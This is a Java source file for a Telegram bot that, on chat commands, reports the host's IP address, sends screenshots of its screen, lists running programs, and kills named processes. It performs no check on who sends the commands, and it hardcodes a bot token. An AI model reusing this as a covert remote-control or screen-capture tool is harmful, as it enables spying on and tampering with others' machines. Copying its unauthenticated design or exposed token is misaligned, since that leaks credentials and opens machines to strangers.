package org.gvozdetscky.api;

import org.gvozdetscky.util.InetIP;
import org.gvozdetscky.util.SystemUtil;
import org.gvozdetscky.util.TaskManager;
import org.telegram.telegrambots.api.methods.send.SendDocument;
import org.telegram.telegrambots.api.methods.send.SendMessage;
import org.telegram.telegrambots.api.objects.Update;
import org.telegram.telegrambots.bots.TelegramLongPollingBot;
import org.telegram.telegrambots.exceptions.TelegramApiException;

public class TelegramApi extends TelegramLongPollingBot {

    private String botUsername = "MyIpTestBot";

    private String botToken = "657140986:AAF1vXWfCuyi0qXIhGEHdkfCM9u8mu4t7Bw";

    @Override
    public void onUpdateReceived(Update update) {
        String message = update.getMessage().getText();

        message = message.toLowerCase();

        if (message.equals("ip")) {
            String ip = InetIP.getInetIP();

            sendMsg(update.getMessage().getChatId().toString(), ip);
        }

        if (message.equals("scr")) {
            sendScreenshot(update.getMessage().getChatId().toString());
        }

        if (message.equals("run")) {

            String runProgramm = TaskManager.getRunProgramm();

            if (runProgramm.length() > 4096) {

                int size = 0;
                int iter = 4096;

                while (size < runProgramm.length()) {
                    sendMsg(update.getMessage().getChatId().toString(), runProgramm.substring(size, iter));

                    size += 4096;

                    if (runProgramm.length() - size < 4096) {
                        sendMsg(update.getMessage().getChatId().toString(), runProgramm.substring(size));
                        break;
                    }
                }

                return;

            }

            sendMsg(update.getMessage().getChatId().toString(), runProgramm);
        }

        if (message.contains("kill")) {

            var nameProcees = message.substring(5);

            String listKillProgramm = TaskManager.killProcess(nameProcees);

            sendMsg(update.getMessage().getChatId().toString(), listKillProgramm);
        }

        System.out.println();
    }

    public synchronized void sendMsg(String chatId, String msg) {

        SendMessage sendMessage = new SendMessage();
        sendMessage.enableMarkdown(true);
        sendMessage.setChatId(chatId);
        sendMessage.setText(msg);


        try {


            sendMessage(sendMessage);


        } catch (TelegramApiException e) {
            e.printStackTrace();
        }

    }

    public synchronized void sendScreenshot(String chatId) {
        SendDocument document = new SendDocument();
        document.setChatId(chatId);
        document.setNewDocument("screenshot.png", new SystemUtil().getInputStreamScreenShot());


        try {


            sendDocument(document);


        } catch (TelegramApiException e) {
            e.printStackTrace();
        }

    }

    @Override
    public String getBotUsername() {
        return botUsername;
    }

    @Override
    public String getBotToken() {
        return botToken;
    }

    public void setBotUsername(String botUsername) {
        this.botUsername = botUsername;
    }

    public void setBotToken(String botToken) {
        this.botToken = botToken;
    }
}
